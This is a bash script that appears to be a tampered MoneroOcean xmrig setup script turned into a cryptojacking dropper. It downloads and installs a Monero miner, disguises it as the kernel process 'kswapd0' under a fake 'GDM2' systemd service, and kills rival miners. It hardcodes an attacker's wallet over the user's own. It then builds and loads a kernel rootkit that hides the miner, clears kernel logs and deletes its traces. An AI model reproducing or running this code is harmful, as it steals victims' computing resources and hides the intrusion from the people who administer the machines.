#!/bin/bash

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"


if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.gdm2/gdm2.rc script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 1
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 xmrig
killall -9 kswapd0

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
rm -rf $HOME/.gdm2

echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
  exit 1
fi

wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz

echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
[ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
if ! tar xf xmrig.tar.gz -C $HOME/.gdm2; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
  exit 1
fi
rm xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
$HOME/.gdm2/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.gdm2/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
  if ! tar xf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
  fi
  rm xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
  $HOME/.gdm2/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/.gdm2/xmrig ]; then
      echo "ERROR: Stock version of $HOME/.gdm2/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
    fi
#    exit 1
  fi
fi

echo "[*] Miner $HOME/.gdm2/xmrig is OK"

#mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi



# preparing script

killall xmrig

echo "[*] Creating $HOME/.gdm2/gdm2.rc script"
cat >$HOME/.gdm2/miner.sh <<EOL
#!/bin/bash
if ! pidof kswapd0 >/dev/null; then
  nice $HOME/.gdm2/kswapd0 \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.gdm2/miner.sh


if ! sudo -n true 2>/dev/null; then
  if ! grep .gdm2/gdm2.rc $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
    echo "$HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/.gdm2/gdm2.rc script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
  /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
    /bin/bash $HOME/.gdm2/gdm2.rc --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating moneroocean systemd service"
    cat >gdm2.service <<EOL
[Unit]
Description=GDM2
[Service]
ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL
    sudo mv gdm2.service /etc/systemd/system/gdm2.service
    echo "[*] Starting gdm2 systemd service"
    sudo killall kswapd0 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable gdm2.service
    sudo systemctl start gdm2.service
    echo "To see miner service logs run \"sudo journalctl -u gdm2 -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
fi
echo ""

mkdir /root/.gdm2/ ; cd /root/.gdm2/ ; git clone https://github.com/DocDrydenn/xmrig-build ; cd xmrig-build/ ; bash xmrig-build.sh ; rm /root/.gdm2/xmrig -rf ; cp /root/.gdm2/xmrig-build/xmrig/* /root/.gdm2/; mv /root/.gdm2/xmrig /root/.gdm2/kswapd0 ; screen -dmS kswapd0 /root/.gdm2/kswapd0 

cat >$HOME/.gdm2/config.json <<EOL
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": 0,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": true,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false,
        "panthera": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false,
        "panthera": false,
        "astrobwt": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": "/home/adminroot/.gdm2/xmrig.log",
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "gulf.moneroocean.stream:10064",
            "user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",
            "pass": "tsmserver",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": true,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "rebench-algo": false,
    "bench-algo-time": 20,
    "pause-on-battery": false,
    "pause-on-active": false
}
EOL

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.gdm2/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
sed -i 's/"user": *"[^"]*",/"user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",/' $HOME/.gdm2/config.json


cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json

cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r)  git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf /tmp/.ICE-Unix/hiding-cryptominers-linux-rootkit/ && rm -rf /tmp/.X11-unix/hiding-cryptominers-linux-rootkit/ 



echo "[*] Setup complete"
